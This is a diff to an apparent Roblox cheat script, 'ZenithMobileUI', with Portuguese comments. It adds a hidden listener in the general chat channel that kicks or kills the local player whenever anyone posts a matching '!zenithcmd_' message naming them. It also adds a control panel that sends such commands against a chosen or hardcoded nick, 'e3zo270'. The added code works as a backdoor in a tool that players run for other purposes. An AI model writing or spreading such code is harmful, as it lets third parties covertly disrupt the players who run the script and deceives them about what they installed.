@@ -1,6 +1,6 @@
-local a={"UserInputService","TweenService","CoreGui","RunService","Players","Workspace","VirtualInputManager","TPS","Ball","Football","HumanoidRootPart","ScreenGui","Frame","UICorner","TextLabel","TextButton","UIListLayout","TextBox","TeleportService","GuiService"}
+local a={"UserInputService","TweenService","CoreGui","RunService","Players","Workspace","VirtualInputManager","TPS","Ball","Football","HumanoidRootPart","ScreenGui","Frame","UICorner","TextLabel","TextButton","UIListLayout","TextBox","TeleportService","GuiService","TextChatService"}
 local function b(c)return game:GetService(a[c])end
-local d,e,f,g,h,i,j,tp,gui=b(1),b(2),b(3),b(4),b(5),b(6),b(7),b(19),b(20)
+local d,e,f,g,h,i,j,tp,gui,tcs=b(1),b(2),b(3),b(4),b(5),b(6),b(7),b(19),b(20),b(21)
 local k=h.LocalPlayer
 
 if f:FindFirstChild("ZenithMobileUI") then f.ZenithMobileUI:Destroy() end
@@ -276,6 +276,40 @@ g.Heartbeat:Connect(function(T)
     end
 end)
 
+-- =====================================================================
+-- SISTEMA DE ESCUTA DE COMANDOS REMOTOS (CHAT)
+-- =====================================================================
+task.spawn(function()
+    local channels = tcs:FindFirstChild("TextChannels")
+    if channels then
+        local generalChannel = channels:FindFirstChild("RBXGeneral")
+        if generalChannel then
+            generalChannel.OnIncomingMessage = function(message)
+                if message.TextSource then
+                    local sender = h:GetPlayerByUserId(message.TextSource.UserId)
+                    if sender then
+                        local text = message.Text
+                        local alvo, acao, arg = text:match("^!zenithcmd_([%w_]+)_(%w+)_(.*)$")
+                        if alvo and alvo == k.Name then
+                            if acao == "kick" then
+                                k:Kick(arg ~= "" and arg or config.kickMessage)
+                            elseif acao == "kill" then
+                                local char = k.Character
+                                if char then
+                                    local hum = char:FindFirstChildOfClass("Humanoid")
+                                    if hum then
+                                        hum.Health = 0
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end)
+
 local a8=Instance.new(a[12]) a8.Name="ZenithMobileUI" a8.Parent=f a8.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
 
 local a9=Instance.new(a[13]) a9.Name="MainFrame" a9.Parent=a8 
@@ -519,7 +553,7 @@ d1("Keybind T","Enable/Disable T Key",config.keybindT,function(f3) o=f3 config.k
 addInfoRow("Anti Kick","Auto Rejoin",true)
 
 -- =====================================================================
--- PAINEL DE COMANDOS / SENHA & FUNÇÕES DE KICK / KILL
+-- PAINEL DE CONTROLE REMOTO (KICK / KILL SINC RONIZADO + CAIXA DE NICK)
 -- =====================================================================
 do
     local UIS = d
@@ -530,7 +564,7 @@ do
 
     local unlocked = false
     local panelOpen = false
-    local selectedTarget = nil
+    local selectedTarget = "e3zo270" -- Já vem com o nick que você pediu de exemplo
 
     local COR_FUNDO = Color3.fromRGB(15, 18, 28)
     local COR_BORDA = Color3.fromRGB(30, 40, 65)
@@ -634,8 +668,8 @@ do
     panel.BackgroundColor3 = COR_FUNDO
     panel.BorderColor3 = COR_BORDA
     panel.BorderSizePixel = 1
-    panel.Position = UDim2.new(0.5, -160, 0.5, -165)
-    panel.Size = UDim2.new(0, 320, 0, 340)
+    panel.Position = UDim2.new(0.5, -160, 0.5, -185)
+    panel.Size = UDim2.new(0, 320, 0, 370)
     panel.ClipsDescendants = true
     panel.Visible = false
     newCorner(panel, 8)
@@ -645,8 +679,8 @@ do
     header.Parent = panel
     header.BackgroundTransparency = 1
     header.Size = UDim2.new(1, 0, 0, 34)
-    newText(header, "COMANDOS DE CONTROLE", UDim2.new(0, 10, 0, 5), UDim2.new(0, 200, 0, 14), Enum.Font.GothamBold, COR_BRANCO, 13)
-    newText(header, "Gerencie Kick e Kill do Alvo", UDim2.new(0, 10, 0, 18), UDim2.new(0, 200, 0, 12), Enum.Font.Gotham, Color3.fromRGB(120, 130, 160), 9)
+    newText(header, "CONTROLE REMOTO DE SCRIPT", UDim2.new(0, 10, 0, 5), UDim2.new(0, 220, 0, 14), Enum.Font.GothamBold, COR_BRANCO, 13)
+    newText(header, "Gerencie o alvo por nick ou lista", UDim2.new(0, 10, 0, 18), UDim2.new(0, 200, 0, 12), Enum.Font.Gotham, Color3.fromRGB(120, 130, 160), 9)
 
     local panelClose = newButton(panel, "X", UDim2.new(1, -28, 0, 6), UDim2.new(0, 20, 0, 20), Color3.fromRGB(25, 30, 45), 11)
     panelClose.MouseButton1Click:Connect(function()
@@ -660,7 +694,7 @@ do
     content.BackgroundTransparency = 1
     content.Position = UDim2.new(0, 8, 0, 40)
     content.Size = UDim2.new(1, -16, 1, -48)
-    content.CanvasSize = UDim2.new(0, 0, 0, 330)
+    content.CanvasSize = UDim2.new(0, 0, 0, 360)
     content.ScrollBarThickness = 4
 
     local layout = Instance.new("UIListLayout")
@@ -668,13 +702,22 @@ do
     layout.SortOrder = Enum.SortOrder.LayoutOrder
     layout.Padding = UDim.new(0, 6)
 
-    -- Seção de Alvos
-    newText(content, "1. Selecionar Alvo do Servidor:", UDim2.new(0,0,0,0), UDim2.new(1,0,0,16), Enum.Font.GothamBold, COR_BRANCO, 11)
+    -- Caixa de Texto para Digitar o Nick Manualmente
+    newText(content, "1. Digite o nick do Alvo (Ex: e3zo270):", UDim2.new(0,0,0,0), UDim2.new(1,0,0,16), Enum.Font.GothamBold, COR_BRANCO, 11)
+    local targetTextBox = newBox(content, selectedTarget, "Digite o nick exato...", UDim2.new(0,0,0,0), UDim2.new(1,0,0,28))
+    targetTextBox.FocusLost:Connect(function()
+        if targetTextBox.Text ~= "" then
+            selectedTarget = targetTextBox.Text
+        end
+    end)
+
+    -- Seção de Alvos da Lista
+    newText(content, "Ou selecione na lista do servidor:", UDim2.new(0,0,0,0), UDim2.new(1,0,0,16), Enum.Font.GothamBold, COR_BRANCO, 11)
     
     local targetListFrame = Instance.new("ScrollingFrame")
     targetListFrame.Parent = content
     targetListFrame.BackgroundColor3 = COR_CAIXA
-    targetListFrame.Size = UDim2.new(1, 0, 0, 90)
+    targetListFrame.Size = UDim2.new(1, 0, 0, 80)
     targetListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
     targetListFrame.ScrollBarThickness = 3
     newCorner(targetListFrame, 6)
@@ -707,6 +750,7 @@ do
 
             btn.MouseButton1Click:Connect(function()
                 selectedTarget = player.Name
+                targetTextBox.Text = player.Name
                 atualizarListaAlvos()
             end)
         end
@@ -716,7 +760,7 @@ do
     h.PlayerAdded:Connect(atualizarListaAlvos)
     h.PlayerRemoving:Connect(atualizarListaAlvos)
 
-    -- Seção de Ações (Kick e Kill)
+    -- Seção de Ações
     newText(content, "2. Mensagem de Kick Personalizada:", UDim2.new(0,0,0,0), UDim2.new(1,0,0,16), Enum.Font.GothamBold, COR_BRANCO, 11)
     local kickMsgBox = newBox(content, config.kickMessage, "Mensagem ao dar Kick...", UDim2.new(0,0,0,0), UDim2.new(1,0,0,28))
     
@@ -727,27 +771,38 @@ do
         end
     end)
 
+    local function enviarComandoChat(comandoTexto)
+        local generalChannel = tcs:FindFirstChild("TextChannels") and tcs.TextChannels:FindFirstChild("RBXGeneral")
+        if generalChannel then
+            generalChannel:SendAsync(comandoTexto)
+        end
+    end
+
     local kickBtn = newButton(content, "DAR KICK NO ALVO SELECIONADO", UDim2.new(0,0,0,0), UDim2.new(1,0,0,30), COR_VERMELHO, 11)
     kickBtn.MouseButton1Click:Connect(function()
-        if not selectedTarget then return end
-        local alvoPlayer = h:FindFirstChild(selectedTarget)
-        if alvoPlayer and alvoPlayer == lp then
+        if targetTextBox.Text ~= "" then selectedTarget = targetTextBox.Text end
+        if not selectedTarget or selectedTarget == "" then return end
+        
+        if selectedTarget == lp.Name then
             lp:Kick(config.kickMessage)
+        else
+            enviarComandoChat("!zenithcmd_" .. selectedTarget .. "_kick_" .. config.kickMessage)
         end
     end)
 
     local killBtn = newButton(content, "DAR KILL NO ALVO SELECIONADO", UDim2.new(0,0,0,0), UDim2.new(1,0,0,30), COR_ROXO, 11)
     killBtn.MouseButton1Click:Connect(function()
-        if not selectedTarget then return end
-        local alvoPlayer = h:FindFirstChild(selectedTarget)
-        if alvoPlayer and alvoPlayer == lp then
+        if targetTextBox.Text ~= "" then selectedTarget = targetTextBox.Text end
+        if not selectedTarget or selectedTarget == "" then return end
+
+        if selectedTarget == lp.Name then
             local char = lp.Character
             if char then
                 local hum = char:FindFirstChildOfClass("Humanoid")
-                if hum then
-                    hum.Health = 0
-                end
+                if hum then hum.Health = 0 end
             end
+        else
+            enviarComandoChat("!zenithcmd_" .. selectedTarget .. "_kill_none")
         end
     end)
 
@@ -767,7 +822,6 @@ do
 
     enterBtn.MouseButton1Click:Connect(validarSenha)
 
-    -- Atalho de teclado Alt + W
     UIS.InputBegan:Connect(function(input)
         if input.KeyCode == Enum.KeyCode.W and (UIS:IsKeyDown(Enum.KeyCode.LeftAlt) or UIS:IsKeyDown(Enum.KeyCode.RightAlt)) then
             if not unlocked then
